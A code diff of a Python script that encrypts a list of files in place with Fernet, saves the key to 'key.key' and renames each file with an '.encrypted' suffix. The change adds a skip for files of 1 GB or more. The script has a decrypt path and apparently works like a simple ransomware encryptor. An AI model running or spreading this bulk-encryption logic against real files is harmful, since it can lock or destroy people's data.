@@ -31,21 +31,27 @@ def getFilePaths(targetDir):
 def encrypt(filePaths):
     key = Fernet.generate_key()
     fernet = Fernet(key)
-   
+    toEncrypt = 0
+
     with open('key.key', 'wb+') as f:
        f.write(key)
        f.close()
     for curFile in filePaths:
         with open(curFile, 'rb+') as f:
-            data = f.read()
-            encrypted = fernet.encrypt(data)
-            f.seek(0)
-            f.write(encrypted)
-            print(curFile)
-            f.close
+            #if file is less than a gigabyte
+            if (os.path.getsize(curFile) < 1073741824):
+                toEncrypt = 1
+                data = f.read()
+                encrypted = fernet.encrypt(data)
+                f.seek(0)
+                f.write(encrypted)
+                print(curFile)
+                f.close
         #renaming file to end with ".encrypted"
-        p = Path(curFile)
-        p.rename(Path(p.parent, f"{p.stem}{p.suffix}.encrypted"))
+        if (toEncrypt == 1):
+            p = Path(curFile)
+            p.rename(Path(p.parent, f"{p.stem}{p.suffix}.encrypted"))
+            toEncrypt = 0
 
 
 #decrypts all files in "filePaths" list     
@@ -93,3 +99,4 @@ if (encryptedFlag == 0):
 
 elif (encryptedFlag == 1):
     decrypt(encFilePaths)
+
